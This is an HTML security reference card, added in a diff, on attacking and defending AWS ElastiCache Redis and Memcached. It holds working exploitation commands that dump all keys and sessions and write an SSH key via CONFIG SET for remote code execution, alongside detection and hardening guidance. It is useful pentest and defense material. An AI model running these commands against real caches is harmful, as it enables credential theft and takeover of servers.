@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AWS ElastiCache Security | AWS Security Cards</title>
+<meta name="description" content="ElastiCache provides managed Redis and Memcached. Often stores session tokens, API keys, and cached credentials. Historically deployed without authentication - a goldmine for attackers.">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    background: #0a0e1a;
+    color: #e2e8f0;
+    line-height: 1.6;
+    padding: 2rem;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+  a { color: #22d3ee; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  /* Card Image */
+  .card-image {
+    border-radius: 1rem;
+    overflow: hidden;
+    margin-bottom: 2rem;
+    border: 1px solid rgba(255,255,255,0.1);
+  }
+  .card-image img {
+    width: 100%;
+    height: auto;
+    display: block;
+  }
+
+  /* Header */
+  .header {
+    position: relative;
+    overflow: hidden;
+    border-radius: 1rem;
+    background: linear-gradient(135deg, #06b6d415, #0a0e1a, #0ea5e915);
+    border: 1px solid #06b6d44d;
+    padding: 2.5rem;
+    margin-bottom: 2rem;
+  }
+  .header::before {
+    content: '';
+    position: absolute;
+    top: 0; right: 0;
+    width: 24rem; height: 24rem;
+    background: #06b6d40d;
+    border-radius: 50%;
+    filter: blur(3rem);
+  }
+  .header-content { position: relative; display: flex; align-items: flex-start; gap: 1.5rem; }
+  .header-icon { width: 64px; height: 64px; flex-shrink: 0; }
+  .header-icon img { width: 100%; height: 100%; }
+  .header-title { font-size: 1.875rem; font-weight: 700; color: #fff; }
+  .header-badge {
+    display: inline-block;
+    padding: 0.25rem 0.75rem;
+    background: #06b6d433;
+    color: #06b6d4;
+    font-size: 0.8rem;
+    font-weight: 600;
+    border-radius: 999px;
+    border: 1px solid #06b6d44d;
+    margin-left: 0.75rem;
+    vertical-align: middle;
+  }
+  .header-desc { color: #94a3b8; max-width: 42rem; margin-top: 0.5rem; }
+
+  /* Stats */
+  .stats-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem; margin-bottom: 2rem; }
+  .stat-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+    text-align: center;
+  }
+  .stat-value { font-size: 1.5rem; font-weight: 700; }
+  .stat-label { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Sections */
+  .section {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1.5rem;
+    margin-bottom: 1.5rem;
+  }
+  .section h2 {
+    font-size: 1.25rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 1rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  /* Overview */
+  .overview-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .overview-grid h4 { font-size: 0.9rem; font-weight: 600; margin-bottom: 0.5rem; }
+  .overview-grid p { font-size: 0.875rem; color: #94a3b8; margin-bottom: 0.75rem; }
+  .attack-note {
+    background: rgba(0,0,0,0.3);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 0.75rem;
+    font-size: 0.875rem;
+    color: #cbd5e1;
+  }
+
+  /* Risk Gauge */
+  .risk-gauge { display: flex; align-items: center; gap: 2rem; }
+  .risk-bar-container { flex: 1; }
+  .risk-bar {
+    height: 1rem;
+    background: #0f172a;
+    border-radius: 999px;
+    overflow: hidden;
+  }
+  .risk-bar-fill {
+    height: 100%;
+    border-radius: 999px;
+    background: linear-gradient(90deg, #eab308, #f97316, #ef4444);
+  }
+  .risk-labels { display: flex; justify-content: space-between; font-size: 0.8rem; color: #94a3b8; margin-top: 0.5rem; }
+  .risk-score { text-align: center; }
+  .risk-score-value { font-size: 2.5rem; font-weight: 700; color: #f87171; }
+  .risk-score-label { font-size: 0.8rem; color: #94a3b8; }
+  .risk-desc { margin-top: 1rem; font-size: 0.875rem; color: #94a3b8; }
+
+  /* Panels Grid */
+  .panels-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.5rem; margin-bottom: 1.5rem; }
+  @media (max-width: 1024px) { .panels-grid { grid-template-columns: repeat(2, 1fr); } }
+  @media (max-width: 640px) { .panels-grid, .stats-row, .overview-grid { grid-template-columns: 1fr; } }
+  .panel {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid;
+    padding: 1.5rem;
+  }
+  .panel h3 { font-size: 1.1rem; font-weight: 700; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+  .panel h4 { font-size: 0.85rem; font-weight: 600; margin-bottom: 0.5rem; margin-top: 1rem; }
+  .panel ul { list-style: none; padding: 0; }
+  .panel li {
+    font-size: 0.85rem;
+    color: #cbd5e1;
+    padding: 0.15rem 0;
+    display: flex;
+    align-items: flex-start;
+    gap: 0.5rem;
+  }
+  .bullet { margin-top: 0.15rem; }
+  .note {
+    margin-top: 1rem;
+    padding: 0.75rem;
+    border-radius: 0.5rem;
+    font-size: 0.85rem;
+  }
+
+  /* Commands */
+  .cmd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .cmd-block { margin-top: 0.75rem; }
+  .cmd-title { font-size: 0.8rem; color: #94a3b8; margin-bottom: 0.25rem; }
+  pre {
+    background: rgba(0,0,0,0.5);
+    border-radius: 0.5rem;
+    padding: 0.75rem;
+    font-size: 0.8rem;
+    color: #4ade80;
+    overflow-x: auto;
+    border: 1px solid rgba(255,255,255,0.06);
+    white-space: pre-wrap;
+    word-break: break-all;
+    font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
+  }
+
+  /* Policies */
+  .policy-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .policy-card {
+    border-radius: 0.5rem;
+    border: 1px solid;
+    padding: 1rem;
+  }
+  .policy-header { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.75rem; font-size: 0.9rem; }
+  .policy-card pre { margin-bottom: 0.75rem; color: #cbd5e1; }
+  .policy-desc { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Defenses */
+  .defense-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .defense-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+  }
+  .defense-card:hover { border-color: #22d3ee4d; }
+  .defense-header { display: flex; align-items: flex-start; gap: 0.75rem; }
+  .defense-icon { font-size: 1.5rem; }
+  .defense-card h4 { font-size: 0.9rem; font-weight: 600; color: #fff; margin-bottom: 0.25rem; }
+  .defense-card p { font-size: 0.85rem; color: #94a3b8; margin-bottom: 0.5rem; }
+  .defense-card pre { color: #22d3ee; }
+
+  /* Footer */
+  .footer { text-align: center; padding: 1.5rem 0; font-size: 0.8rem; color: #64748b; }
+  .footer a { color: #22d3ee; }
+
+  /* Prevent ugly page-break splits */
+  .card-image,
+  .header,
+  .stat-card,
+  .stats-row,
+  .section,
+  .panel,
+  .cmd-block,
+  .policy-card,
+  .defense-card,
+  .attack-note,
+  .overview-grid > div,
+  .risk-gauge,
+  .note {
+    break-inside: avoid;
+    page-break-inside: avoid;
+  }
+  .section,
+  .panels-grid,
+  .card-image,
+  .header {
+    break-before: auto;
+    page-break-before: auto;
+  }
+  /* Keep headings with their content */
+  h2, h3, h4 {
+    break-after: avoid;
+    page-break-after: avoid;
+  }
+
+  @media print {
+    body { background: #0a0e1a; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    /* Switch panels to 2-col for better page flow */
+    .panels-grid { grid-template-columns: repeat(2, 1fr); }
+    /* Switch commands and policies to single column to avoid splits */
+    .cmd-grid { grid-template-columns: 1fr; }
+    .policy-grid { grid-template-columns: 1fr; }
+    .defense-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- Card Image -->
+<div class="card-image">
+  <img src="../images/elasticache-card.webp" alt="AWS ElastiCache Security" />
+</div>
+
+<!-- Header -->
+<div class="header">
+  <div class="header-content">
+    <div class="header-icon"><img src="../icons/elasticache.svg" alt="AWS ElastiCache Security" /></div>
+    <div>
+      <div>
+        <span class="header-title">AWS ElastiCache Security</span>
+        <span class="header-badge">IN-MEMORY CACHE</span>
+      </div>
+      <p class="header-desc">ElastiCache provides managed Redis and Memcached. Often stores session tokens, API keys, and cached credentials. Historically deployed without authentication - a goldmine for attackers.</p>
+    </div>
+  </div>
+</div>
+
+<!-- Stats -->
+<div class="stats-row">
+        <div class="stat-card">
+          <div class="stat-value" style="color: #f87171;">HIGH</div>
+          <div class="stat-label">Risk Level</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #4ade80;">VPC Only</div>
+          <div class="stat-label">Access</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #60a5fa;">Redis/MC</div>
+          <div class="stat-label">Engines</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #c084fc;">6379/11211</div>
+          <div class="stat-label">Default Ports</div>
+        </div></div>
+
+<!-- Overview -->
+<div class="section"><h2><span style="color:#06b6d4;">&#x1F4CB;</span> Service Overview</h2><div class="overview-grid">
+        <div>
+          <h4 style="color: #06b6d4;">Redis (ElastiCache for Redis)</h4>
+          <p>In-memory data structure store supporting strings, hashes, lists, sets. Supports AUTH command, ACLs (Redis 6+), and encryption. Often stores sessions, rate limits, and cached API responses.</p>
+          <div class="attack-note"><span style="color:#06b6d4;">Attack note:</span> Many Redis instances still run without AUTH. If accessible, dump all keys with KEYS * and extract sensitive data.</div>
+        </div>
+        <div>
+          <h4 style="color: #06b6d4;">Memcached</h4>
+          <p>Simple key-value cache with no built-in authentication. Relies entirely on network security. Often stores serialized objects that may contain credentials or sensitive data.</p>
+          <div class="attack-note"><span style="color:#06b6d4;">Attack note:</span> Memcached has NO authentication - if you can reach it, you own it. Use stats slabs and cachedump to extract all keys.</div>
+        </div></div></div>
+
+<!-- Risk Assessment -->
+
+<div class="section">
+  <h2>Security Risk Assessment</h2>
+  <div class="risk-gauge">
+    <div class="risk-bar-container">
+      <div class="risk-bar">
+        <div class="risk-bar-fill" style="width: 80%;"></div>
+      </div>
+      <div class="risk-labels"><span>Low</span><span>Medium</span><span>High</span><span>Critical</span></div>
+    </div>
+    <div class="risk-score">
+      <div class="risk-score-value">8.0</div>
+      <div class="risk-score-label">Risk Score</div>
+    </div>
+  </div>
+  <p class="risk-desc">ElastiCache instances often contain session tokens, API keys, cached credentials, and user data. Legacy deployments without AUTH are common. Network access = full data access in most cases.</p>
+</div>
+
+<!-- Main Panels -->
+<div class="panels-grid">
+      <div class="panel" style="border-color: #f8717133;">
+        <h3 style="color: #f87171;">⚔️ Attack Vectors</h3><h4 style="color: #f87171;">Direct Access</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Connect via redis-cli or telnet</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> KEYS * to enumerate all keys</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> GET &lt;key&gt; to extract values</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> DUMP all data for offline analysis</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> SCAN for incremental enumeration</li></ul><h4 style="color: #f87171;">Advanced Attacks</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Lua script execution (EVAL)</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> CONFIG SET to modify settings</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> SLAVEOF for data replication</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> MODULE LOAD for RCE (if enabled)</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> MIGRATE to copy data externally</li></ul></div>
+      <div class="panel" style="border-color: #fb923c33;">
+        <h3 style="color: #fb923c;">⚠️ Misconfigurations</h3><h4 style="color: #fb923c;">Authentication Issues</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No AUTH password configured</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Default or weak AUTH password</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No ACLs (Redis 6+)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> AUTH token in application logs</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Shared credentials across envs</li></ul><h4 style="color: #fb923c;">Network Issues</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Security group allows 0.0.0.0/0</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Accessible from untrusted subnets</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No encryption in transit (TLS)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Public subnet placement</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> VPC peering exposes cache</li></ul></div>
+      <div class="panel" style="border-color: #22d3ee33;">
+        <h3 style="color: #22d3ee;">🔍 Enumeration</h3>
+        <div class="cmd-block">
+          <div class="cmd-title">List ElastiCache Clusters</div>
+          <pre><code>aws elasticache describe-cache-clusters</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Replication Groups (Redis)</div>
+          <pre><code>aws elasticache describe-replication-groups</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Get Cluster Endpoints</div>
+          <pre><code>aws elasticache describe-cache-clusters \\
+  --show-cache-node-info \\
+  --query 'CacheClusters[].CacheNodes[].Endpoint'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Check Security Groups</div>
+          <pre><code>aws elasticache describe-cache-clusters \\
+  --query 'CacheClusters[].SecurityGroups'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Check Auth Token Enabled</div>
+          <pre><code>aws elasticache describe-replication-groups \\
+  --query 'ReplicationGroups[].AuthTokenEnabled'</code></pre>
+        </div></div>
+      <div class="panel" style="border-color: #c084fc33;">
+        <h3 style="color: #c084fc;">🔓 Redis Exploitation</h3><h4 style="color: #c084fc;">Data Extraction</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> KEYS * - list all keys</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> GET session:* - steal sessions</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> HGETALL user:* - dump user data</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> LRANGE queue:* 0 -1 - read queues</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> SMEMBERS set:* - read sets</li></ul><h4 style="color: #c084fc;">Redis RCE Techniques</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Write SSH key via CONFIG SET</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Write crontab via CONFIG SET</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Lua script execution (EVAL)</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Module loading (if allowed)</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Master-slave replication attack</li></ul><div class="note"><strong>Classic RCE:</strong> CONFIG SET dir /root/.ssh &amp;&amp; CONFIG SET dbfilename authorized_keys &amp;&amp; SET x &quot;ssh-rsa AAAA...&quot; &amp;&amp; SAVE</div></div>
+      <div class="panel" style="border-color: #facc1533;">
+        <h3 style="color: #facc15;">📦 Memcached Exploitation</h3><h4 style="color: #facc15;">Data Extraction</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> stats - server statistics</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> stats slabs - memory allocation</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> stats cachedump &lt;slab&gt; &lt;limit&gt; - dump keys</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> get &lt;key&gt; - retrieve value</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> stats items - item statistics</li></ul><h4 style="color: #facc15;">Common Key Patterns</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> session_* - user sessions</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> user_* - cached user data</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> api_key_* - API credentials</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> token_* - auth tokens</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> cache_* - general cached data</li></ul></div>
+      <div class="panel" style="border-color: #4ade8033;">
+        <h3 style="color: #4ade80;">🛡️ Detection</h3><h4 style="color: #4ade80;">CloudTrail Events</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> DescribeCacheClusters - enumeration</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateCacheCluster - new cache</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> ModifyCacheCluster - config change</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> ModifyReplicationGroup - replication change</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Note: No data plane logging!</li></ul><h4 style="color: #4ade80;">Network Detection</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> VPC Flow Logs on cache subnets</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Unusual source IPs to port 6379/11211</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Large data transfers from cache</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Connections from unexpected instances</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> GuardDuty EC2 finding types</li></ul></div></div>
+
+<!-- Exploitation -->
+<div class="section"><h2><span style="color:#f87171;">&#x1F4BB;</span> Exploitation Commands</h2><div class="cmd-grid">
+        <div class="cmd-block">
+          <div class="cmd-title">Connect to Redis (No Auth)</div>
+          <pre><code>redis-cli -h my-cache.xxxxx.use1.cache.amazonaws.com -p 6379</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Connect to Redis (With Auth)</div>
+          <pre><code>redis-cli -h my-cache.xxxxx.use1.cache.amazonaws.com -p 6379 \\
+  --tls -a 'AUTH_TOKEN'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Dump All Redis Keys</div>
+          <pre><code>redis-cli -h HOST KEYS '*' | while read key; do
+  echo &quot;=== $key ===&quot;
+  redis-cli -h HOST GET &quot;$key&quot;
+done</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Connect to Memcached</div>
+          <pre><code>telnet my-cache.xxxxx.cfg.use1.cache.amazonaws.com 11211</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Dump Memcached Keys</div>
+          <pre><code>echo &quot;stats cachedump 1 100&quot; | nc HOST 11211
+# Then: echo &quot;get &lt;key&gt;&quot; | nc HOST 11211</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Redis SSH Key RCE</div>
+          <pre><code>redis-cli -h HOST
+&gt; CONFIG SET dir /var/lib/redis/.ssh
+&gt; CONFIG SET dbfilename authorized_keys
+&gt; SET pwn &quot;\
+\
+ssh-rsa AAAA...\
+\
+&quot;
+&gt; SAVE</code></pre>
+        </div></div></div>
+
+<!-- Policies -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F4DC;</span> Policy Examples</h2><div class="policy-grid">
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - No Auth, Open Security Group</span>
+          </div>
+          <pre><code># Cluster Config
+AuthTokenEnabled: false
+TransitEncryptionEnabled: false
+AtRestEncryptionEnabled: false
+
+# Security Group
+Inbound: 0.0.0.0/0:6379 (ALLOW)</code></pre>
+          <p class="policy-desc">No authentication, no encryption, accessible from anywhere - fully compromised</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Auth, Encryption, Restricted</span>
+          </div>
+          <pre><code># Cluster Config
+AuthTokenEnabled: true
+TransitEncryptionEnabled: true
+AtRestEncryptionEnabled: true
+KmsKeyId: arn:aws:kms:...:key/xxx
+
+# Security Group
+Inbound: sg-app-servers:6379 (ALLOW)</code></pre>
+          <p class="policy-desc">AUTH required, TLS enabled, KMS encryption, restricted to app security group</p>
+        </div>
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Risky - Weak Network Controls</span>
+          </div>
+          <pre><code># Security Group
+Inbound: 10.0.0.0/8:6379 (ALLOW)
+# Allows entire corporate network
+
+# Subnet
+SubnetType: Private
+# But VPC peering allows access</code></pre>
+          <p class="policy-desc">Too broad network access - any compromised instance can reach cache</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Redis 6 ACLs</span>
+          </div>
+          <pre><code># Redis ACL Configuration
+user app-reader on &gt;password ~session:* +get +mget
+user app-writer on &gt;password ~cache:* +set +get +del
+user admin on &gt;strongpass ~* +@all
+
+# Default user disabled
+user default off</code></pre>
+          <p class="policy-desc">Granular ACLs with least privilege per application role</p>
+        </div></div></div>
+
+<!-- Defenses -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F6E1;&#xFE0F;</span> Defense Recommendations</h2><div class="defense-grid">
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔐</span>
+            <div>
+              <h4>Enable AUTH (Redis)</h4>
+              <p>Always configure AUTH token. Use strong, rotated passwords.</p>
+              <pre><code>aws elasticache modify-replication-group \\
+  --replication-group-id my-group \\
+  --auth-token 'NewStrongToken123!' \\
+  --auth-token-update-strategy ROTATE</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔒</span>
+            <div>
+              <h4>Enable TLS Encryption</h4>
+              <p>Enable in-transit encryption for all connections.</p>
+              <pre><code>aws elasticache modify-replication-group \\
+  --replication-group-id my-group \\
+  --transit-encryption-enabled</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔑</span>
+            <div>
+              <h4>Enable At-Rest Encryption</h4>
+              <p>Encrypt data at rest with KMS keys.</p>
+              <pre><code>aws elasticache create-replication-group \\
+  --at-rest-encryption-enabled \\
+  --kms-key-id arn:aws:kms:...:key/xxx</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🚫</span>
+            <div>
+              <h4>Restrict Security Groups</h4>
+              <p>Only allow connections from specific application security groups.</p>
+              
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">👥</span>
+            <div>
+              <h4>Use Redis 6 ACLs</h4>
+              <p>Implement granular access control with user-based permissions.</p>
+              
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">📊</span>
+            <div>
+              <h4>Monitor with VPC Flow Logs</h4>
+              <p>Since no data plane CloudTrail, use flow logs to detect unusual access.</p>
+              
+            </div>
+          </div>
+        </div></div></div>
+
+<!-- Footer -->
+<div class="footer">
+  <p>AWS ElastiCache Security Card</p>
+  <p style="margin-top:0.25rem;">Always obtain proper authorization before testing</p>
+</div>
+
+</body>
+</html>
